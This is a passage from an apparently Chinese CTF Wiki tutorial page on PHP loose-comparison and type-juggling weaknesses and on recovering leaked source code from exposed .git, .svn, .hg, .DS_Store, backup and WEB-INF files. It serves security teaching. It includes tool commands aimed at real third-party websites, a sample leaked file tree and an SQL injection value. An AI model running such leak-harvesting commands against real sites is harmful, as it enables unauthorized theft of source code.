<p>比如在 <code class="docutils literal"><span class="pre">$a</span> <span class="pre">==</span> <span class="pre">$b</span></code> 的比较中</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>$a = null;
$b = false; //为真
$a = &#39;&#39;;
$b = 0; //同样为真
</pre></div>
</div>
<p>然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">0==&#39;0&#39; //true</span>
<span class="x">0 == &#39;abcdefg&#39; //true</span>
<span class="x">0 === &#39;abcdefg&#39; //false</span>
<span class="x">1 == &#39;1abcdef&#39; //true</span>
</pre></div>
</div>
</div>
<div class="section" id="hash">
<h3>魔法 Hash<a class="headerlink" href="#hash" title="永久链接至标题">¶</a></h3>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true</span>
<span class="x">&quot;0e123456abc&quot;==&quot;0e1dddada&quot; //false</span>
<span class="x">&quot;0e1abc&quot;==&quot;0&quot;  //true</span>
</pre></div>
</div>
<p>在进行比较运算时，如果遇到了 <code class="docutils literal"><span class="pre">0e\d+</span></code> 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 <code class="docutils literal"><span class="pre">0e\d+</span></code> 这种模式就不会相等。</p>
</div>
<div class="section" id="id16">
<h3>十六进制转换<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h3>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">&quot;0x1e240&quot;==&quot;123456&quot; //true</span>
<span class="x">&quot;0x1e240&quot;==123456 //true</span>
<span class="x">&quot;0x1e240&quot;==&quot;1e240&quot; //false</span>
</pre></div>
</div>
<p>当其中的一个字符串是 <code class="docutils literal"><span class="pre">0x</span></code> 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，<code class="docutils literal"><span class="pre">0x1240</span></code> 解析成为十进制就是 123456，所以与 <code class="docutils literal"><span class="pre">int</span></code> 类型和 <code class="docutils literal"><span class="pre">string</span></code> 类型的 123456 比较都是相等。</p>
</div>
<div class="section" id="id17">
<h3>类型转换<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h3>
<p>常见的转换主要就是 <code class="docutils literal"><span class="pre">int</span></code> 转换为 <code class="docutils literal"><span class="pre">string</span></code>，<code class="docutils literal"><span class="pre">string</span></code> 转换为 <code class="docutils literal"><span class="pre">int</span></code>。</p>
<p><code class="docutils literal"><span class="pre">int</span></code> 转 <code class="docutils literal"><span class="pre">string</span></code></p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">$var = 5;</span>
<span class="x">方式1：$item = (string)$var;</span>
<span class="x">方式2：$item = strval($var);</span>
</pre></div>
</div>
<p><code class="docutils literal"><span class="pre">string</span></code> 转 <code class="docutils literal"><span class="pre">int</span></code>：<code class="docutils literal"><span class="pre">intval()</span></code> 函数。</p>
<p>对于这个函数，可以先看 2 个例子。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">var_dump(intval(&#39;2&#39;)) //2</span>
<span class="x">var_dump(intval(&#39;3abcd&#39;)) //3</span>
<span class="x">var_dump(intval(&#39;abcd&#39;)) //0</span>
</pre></div>
</div>
<p>说明 <code class="docutils literal"><span class="pre">intval()</span></code> 转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串， <code class="docutils literal"><span class="pre">intval()</span></code> 不会报错而是返回 0。</p>
<p>同时，程序员在编程的时候也不应该使用如下的这段代码：</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">if(intval($a)&gt;1000) {</span>
<span class="x"> mysql_query(&quot;select * from news where id=&quot;.$a)</span>
<span class="x">}</span>
</pre></div>
</div>
<p>这个时候 <code class="docutils literal"><span class="pre">$a</span></code> 的值有可能是 <code class="docutils literal"><span class="pre">1002</span> <span class="pre">union</span></code>。</p>
</div>
<div class="section" id="id18">
<h3>内置函数的参数的松散性<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h3>
<p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p>
<p><strong>md5()</strong></p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">$array1[] = array(</span>
<span class="x"> &quot;foo&quot; =&gt; &quot;bar&quot;,</span>
<span class="x"> &quot;bar&quot; =&gt; &quot;foo&quot;,</span>
<span class="x">);</span>
<span class="x">$array2 = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hello&quot;, &quot;world&quot;);</span>
<span class="x">var_dump(md5($array1)==var_dump($array2)); //true</span>
</pre></div>
</div>
<p>PHP 手册中的 md5（）函数的描述是 <code class="docutils literal"><span class="pre">string</span> <span class="pre">md5</span> <span class="pre">(</span> <span class="pre">string</span> <span class="pre">$str</span> <span class="pre">[,</span> <span class="pre">bool</span> <span class="pre">$raw_output</span> <span class="pre">=</span> <span class="pre">false</span> <span class="pre">]</span> <span class="pre">)</span></code>，<code class="docutils literal"><span class="pre">md5()</span></code> 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，<code class="docutils literal"><span class="pre">md5()</span></code> 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。</p>
<p><strong>strcmp()</strong></p>
<p><code class="docutils literal"><span class="pre">strcmp()</span></code> 函数在 PHP 官方手册中的描述是 <code class="docutils literal"><span class="pre">intstrcmp</span> <span class="pre">(</span> <span class="pre">string</span> <span class="pre">$str1</span> <span class="pre">，</span> <span class="pre">string</span> <span class="pre">$str2</span> <span class="pre">)</span></code>，需要给 <code class="docutils literal"><span class="pre">strcmp()</span></code> 传递 2 个 <code class="docutils literal"><span class="pre">string</span></code> 类型的参数。如果 <code class="docutils literal"><span class="pre">str1</span></code> 小于 <code class="docutils literal"><span class="pre">str2</span></code>，返回 -1，相等返回 0，否则返回 1。<code class="docutils literal"><span class="pre">strcmp()</span></code> 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。</p>
<p>如果传入给出 <code class="docutils literal"><span class="pre">strcmp()</span></code> 的参数是数字呢？</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">$array=[1,2,3];</span>
<span class="x">var_dump(strcmp($array,&#39;123&#39;)); //null,在某种意义上null也就是相当于false。</span>
</pre></div>
</div>
<p><strong>switch()</strong></p>
<p>如果 <code class="docutils literal"><span class="pre">switch()</span></code> 是数字类型的 case 的判断时，switch
会将其中的参数转换为 int 类型。如下：</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">$i =&quot;2abc&quot;;</span>
<span class="x">switch ($i) {</span>
<span class="x">case 0:</span>
<span class="x">case 1:</span>
<span class="x">case 2:</span>
<span class="x"> echo &quot;i is less than 3 but not negative&quot;;</span>
<span class="x"> break;</span>
<span class="x">case 3:</span>
<span class="x"> echo &quot;i is 3&quot;;</span>
<span class="x">}</span>
</pre></div>
</div>
<p>这个时候程序输出的是 <code class="docutils literal"><span class="pre">i</span> <span class="pre">is</span> <span class="pre">less</span> <span class="pre">than</span> <span class="pre">3</span> <span class="pre">but</span> <span class="pre">not</span> <span class="pre">negative</span></code> ，是由于 <code class="docutils literal"><span class="pre">switch()</span></code> 函数将 <code class="docutils literal"><span class="pre">$i</span></code> 进行了类型转换，转换结果为
2。</p>
<p><strong>in_array()</strong></p>
<p>在 PHP
手册中， <code class="docutils literal"><span class="pre">in_array()</span></code> 函数的解释是 <code class="docutils literal"><span class="pre">bool</span> <span class="pre">in_array</span> <span class="pre">(</span> <span class="pre">mixed</span> <span class="pre">$needle</span> <span class="pre">,</span> <span class="pre">array</span> <span class="pre">$haystack</span> <span class="pre">[,</span> <span class="pre">bool</span> <span class="pre">$strict</span> <span class="pre">=</span> <span class="pre">FALSE</span> <span class="pre">]</span> <span class="pre">)</span></code>
,如果strict参数没有提供，那么in_array就会使用松散比较来判断 <code class="docutils literal"><span class="pre">$needle</span></code> 是否在 <code class="docutils literal"><span class="pre">$haystack</span></code> 中。当
strince 的值为 true 时， <code class="docutils literal"><span class="pre">in_array()</span></code> 会比较 needls 的类型和
haystack 中的类型是否相同。</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">$array=[0,1,2,&#39;3&#39;];</span>
<span class="x">var_dump(in_array(&#39;abc&#39;, $array)); //true</span>
<span class="x">var_dump(in_array(&#39;1bc&#39;, $array)); //true</span>
</pre></div>
</div>
<p>可以看到上面的情况返回的都是 true，因为 <code class="docutils literal"><span class="pre">'abc'</span></code> 会转换为
0， <code class="docutils literal"><span class="pre">'1bc'</span></code> 转换为 1。</p>
<p><code class="docutils literal"><span class="pre">array_search()</span></code> 与 <code class="docutils literal"><span class="pre">in_array()</span></code> 也是一样的问题。</p>
</div>
</div>
<div class="section" id="id19">
<h2>寻找源代码备份<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h2>
<div class="section" id="hg">
<h3>hg 源码泄露<a class="headerlink" href="#hg" title="永久链接至标题">¶</a></h3>
<p><code class="docutils literal"><span class="pre">hg</span> <span class="pre">init</span></code> 时会产生 <code class="docutils literal"><span class="pre">.hg</span></code> 文件。</p>
<p><a class="reference external" href="https://github.com/kost/dvcs-ripper">利用工具 dvcs-ripper</a></p>
</div>
<div class="section" id="git">
<h3>Git 源码泄露<a class="headerlink" href="#git" title="永久链接至标题">¶</a></h3>
<p><code class="docutils literal"><span class="pre">.git</span></code> 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/.</span><span class="n">git</span>
<span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">HEAD</span>
<span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">index</span>
<span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">config</span>
<span class="o">/.</span><span class="n">git</span><span class="o">/</span><span class="n">description</span>
</pre></div>
</div>
<p><a class="reference external" href="https://github.com/lijiejie/GitHack">GitHack</a></p>
<div class="highlight-shell"><div class="highlight"><pre><span></span>python GitHack.py http://www.openssl.org/.git/
</pre></div>
</div>
<p><a class="reference external" href="https://github.com/WangYihang/GitHacker">GitHacker（可恢复完整 Git 仓库）</a></p>
<div class="highlight-shell"><div class="highlight"><pre><span></span>python GitHacker.py http://www.openssl.org/.git/
</pre></div>
</div>
</div>
<div class="section" id="ds-store">
<h3><code class="docutils literal"><span class="pre">.DS_Store</span></code> 文件泄露<a class="headerlink" href="#ds-store" title="永久链接至标题">¶</a></h3>
<p>Mac OS 中会包含有 <code class="docutils literal"><span class="pre">.DS_Store</span></code> 文件，包含文件名等信息。</p>
<p><a class="reference external" href="https://github.com/lijiejie/ds_store_exp">利用工具 ds＿store＿exp</a></p>
<div class="highlight-shell"><div class="highlight"><pre><span></span>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store

hd.zj.qq.com/
└── themes
    └── galaxyw
        ├── app
        │   └── css
        │       └── style.min.css
        ├── cityData.min.js
        ├── images
        │   └── img
        │       ├── bg-hd.png
        │       ├── bg-item-activity.png
        │       ├── bg-masker-pop.png
        │       ├── btn-bm.png
        │       ├── btn-login-qq.png
        │       ├── btn-login-wx.png
        │       ├── ico-add-pic.png
        │       ├── ico-address.png
        │       ├── ico-bm.png
        │       ├── ico-duration-time.png
        │       ├── ico-pop-close.png
        │       ├── ico-right-top-delete.png
        │       ├── page-login-hd.png
        │       ├── pic-masker.png
        │       └── ticket-selected.png
        └── member
            ├── assets
            │   ├── css
            │   │   ├── ace-reset.css
            │   │   └── antd.css
            │   └── lib
            │       ├── cityData.min.js
            │       └── ueditor
            │           ├── index.html
            │           ├── lang
            │           │   └── zh-cn
            │           │       ├── images
            │           │       │   ├── copy.png
            │           │       │   ├── localimage.png
            │           │       │   ├── music.png
            │           │       │   └── upload.png
            │           │       └── zh-cn.js
            │           ├── php
            │           │   ├── action_crawler.php
            │           │   ├── action_list.php
            │           │   ├── action_upload.php
            │           │   ├── config.json
            │           │   ├── controller.php
            │           │   └── Uploader.class.php
            │           ├── ueditor.all.js
            │           ├── ueditor.all.min.js
            │           ├── ueditor.config.js
            │           ├── ueditor.parse.js
            │           └── ueditor.parse.min.js
            └── static
                ├── css
                │   └── page.css
                ├── img
                │   ├── bg-table-title.png
                │   ├── bg-tab-say.png
                │   ├── ico-black-disabled.png
                │   ├── ico-black-enabled.png
                │   ├── ico-coorption-person.png
                │   ├── ico-miss-person.png
                │   ├── ico-mr-person.png
                │   ├── ico-white-disabled.png
                │   └── ico-white-enabled.png
                └── scripts
                    ├── js
                    └── lib
                        └── jquery.min.js

<span class="m">21</span> directories, <span class="m">48</span> files
</pre></div>
</div>
</div>
<div class="section" id="id20">
<h3>网站备份文件<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h3>
<p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p>
<p>常见的后缀名：</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">.</span><span class="n">rar</span>
<span class="o">.</span><span class="n">zip</span>
<span class="o">.</span><span class="mi">7</span><span class="n">z</span>
<span class="o">.</span><span class="n">tar</span>
<span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span>
<span class="o">.</span><span class="n">bak</span>
<span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</div>
<div class="section" id="svn">
<h3>SVN 泄露<a class="headerlink" href="#svn" title="永久链接至标题">¶</a></h3>
<p>敏感文件：</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">/.</span><span class="n">svn</span>
<span class="o">/.</span><span class="n">svn</span><span class="o">/</span><span class="n">wc</span><span class="o">.</span><span class="n">db</span>
<span class="o">/.</span><span class="n">svn</span><span class="o">/</span><span class="n">entries</span>
</pre></div>
</div>
<p><a class="reference external" href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
<div class="highlight-shell"><div class="highlight"><pre><span></span>perl rip-svn.pl -v -u http://www.example.com/.svn/
</pre></div>
</div>
<p><a class="reference external" href="http://tools.40huo.cn/#!web.md#源码泄露">Seay - SVN</a></p>
</div>
<div class="section" id="web-inf-web-xml">
<h3>WEB-INF / web.xml 泄露<a class="headerlink" href="#web-inf-web-xml" title="永久链接至标题">¶</a></h3>
<p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<ul class="simple">
<li><code class="docutils literal"><span class="pre">/WEB-INF/web.xml</span></code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li><code class="docutils literal"><span class="pre">/WEB-INF/classes/</span></code> ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。</li>
<li><code class="docutils literal"><span class="pre">/WEB-INF/lib/</span></code> ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li>
<li><code class="docutils literal"><span class="pre">/WEB-INF/src/</span></code> ：源码目录，按照包名结构放置各个 java 文件。</li>
<li><code class="docutils literal"><span class="pre">/WEB-INF/database.properties</span></code> ：数据库配置文件。</li>
</ul>
<p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p>
<div class="highlight-nginx"><div class="highlight"><pre><span></span><span class="k">location</span> <span class="p">~</span> <span class="sr">^/WEB-INF/*</span> <span class="p">{</span> <span class="kn">deny</span> <span class="s">all</span><span class="p">;</span> <span class="p">}</span> <span class="c1"># 或者return 404; 或者其他！</span>
</pre></div>
</div>
</div>
<div class="section" id="cvs">
<h3>CVS 泄露<a class="headerlink" href="#cvs" title="永久链接至标题">¶</a></h3>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">url</span><span class="o">/</span><span class="n">CVS</span><span class="o">/</span><span class="n">Root</span> <span class="n">返回根信息</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">url</span><span class="o">/</span><span class="n">CVS</span><span class="o">/</span><span class="n">Entries</span> <span class="n">返回所有文件的结构</span>
</pre></div>
</div>
<p>取回源码</p>
<div class="highlight-shell"><div class="highlight"><pre><span></span>bk clone http://url/name dir
</pre></div>
</div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../reverse/index.html" class="btn btn-neutral float-right" title="Reverse Engineering" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="ssrf.html" class="btn btn-neutral" title="SSRF 服务端请求伪造" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, CTF Wiki.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="../_static/translations.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>